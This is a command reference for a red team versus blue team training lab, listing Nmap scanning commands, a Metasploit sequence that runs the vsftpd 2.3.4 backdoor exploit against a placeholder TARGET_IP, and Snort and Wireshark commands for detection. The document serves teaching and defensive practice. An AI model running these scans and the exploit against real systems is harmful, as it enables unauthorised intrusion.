# Command Reference – Red Team vs Blue Team Simulation Lab

This document contains all important commands used in the project.  
The commands are grouped by tool so that the workflow is easy to understand.

Tools Used in this Lab

• Nmap – Network scanning and enumeration  
• Metasploit Framework – Exploitation  
• Snort – Intrusion Detection System (IDS)  
• Wireshark – Network traffic analysis  

------------------------------------------------------------

# 1 Nmap Commands (Network Scanning)

Nmap is used to discover systems, scan ports, and identify running services.

## 1.1 Check if Target Host is Alive

Command

```
ping TARGET_IP
```

Purpose  
Checks whether the target machine is reachable.

Alternative command

```
nmap -sn TARGET_IP
```

This performs host discovery without scanning ports.

---

## 1.2 Scan for Open Ports

Command

```
nmap -sS --open -T4 TARGET_IP
```

Explanation

-sS → TCP SYN scan (fast and stealthy)  
--open → shows only open ports  
-T4 → increases scanning speed

Purpose  
Quickly identifies open ports on the target system.

---

## 1.3 Detect Running Services

Command

```
nmap -sS -sV --open -T4 TARGET_IP
```

Explanation

-sV → detects service versions

Example services detected

FTP  
SSH  
HTTP

Purpose  
Identifies what applications are running on open ports.

---

## 1.4 Scan Specific Ports

Command

```
nmap -p 21,22,80 TARGET_IP
```

Purpose  
Scans only selected ports instead of scanning all ports.

---

## 1.5 Scan All Ports

Command

```
nmap -p- TARGET_IP
```

Purpose  
Scans all 65535 ports of the target system.

---

## 1.6 Detect Vulnerabilities

Command

```
nmap --script vuln TARGET_IP
```

Purpose  
Runs vulnerability detection scripts.

---

## 1.7 Detect Operating System

Command

```
nmap -O TARGET_IP
```

Purpose  
Attempts to detect the operating system running on the target.

------------------------------------------------------------

# 2 Metasploit Commands (Exploitation)

Metasploit is used to exploit vulnerabilities discovered during scanning.

## 2.1 Start Metasploit Framework

Command

```
msfconsole
```

Purpose  
Launches the Metasploit exploitation framework.

---

## 2.2 Search for Exploits

Command

```
search vsftpd
```

Purpose  
Finds exploits related to the vulnerable FTP service.

---

## 2.3 Select Exploit

Command

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

Purpose  
Loads the exploit module targeting the vulnerable service.

---

## 2.4 View Exploit Options

Command

```
show options
```

Purpose  
Displays required parameters for the exploit.

---

## 2.5 Set Target IP

Command

```
set RHOST TARGET_IP
```

Purpose  
Specifies the target machine.

---

## 2.6 Run Exploit

Command

```
exploit
```

or

```
run
```

Purpose  
Attempts to gain access to the target system.

------------------------------------------------------------

# 3 Snort Commands (Intrusion Detection)

Snort is used by the Blue Team to detect suspicious network activity.

## 3.1 Test Snort Configuration

Command

```
sudo snort -T -c /etc/snort/snort.conf
```

Purpose  
Checks whether the configuration file is valid.

---

## 3.2 Start Snort IDS

Command

```
sudo snort -A console -i eth0 -c /etc/snort/snort.conf
```

Explanation

-A console → show alerts in terminal  
-i eth0 → monitor network interface  
-c → load configuration file

Purpose  
Detects attacks such as port scanning and exploitation attempts.

---

## 3.3 Run Snort in Packet Logging Mode

Command

```
sudo snort -dev -i eth0
```

Purpose  
Logs captured packets for analysis.

------------------------------------------------------------

# 4 Wireshark Commands (Network Monitoring)

Wireshark is used to capture and analyze network packets.

## 4.1 Start Wireshark

Command

```
sudo wireshark
```

Purpose  
Launches the packet capture interface.

---

## 4.2 Capture Network Traffic

Steps

1 Select active network interface  
2 Start packet capture  
3 Perform attack from Kali Linux  
4 Observe captured packets

---

## 4.3 Useful Wireshark Filters

Show TCP traffic

```
tcp
```

Show HTTP traffic

```
http
```

Show FTP communication

```
ftp
```

Show traffic from specific IP

```
ip.addr == TARGET_IP
```

Purpose  
Filters help security analysts identify suspicious traffic.

------------------------------------------------------------

# Overall Workflow of the Project

1 Host discovery  
2 Port scanning  
3 Service detection  
4 Vulnerability scanning  
5 Exploitation using Metasploit  
6 Intrusion detection using Snort  
7 Packet analysis using Wireshark

This lab demonstrates how attackers perform penetration testing and how defenders monitor and detect those attacks.
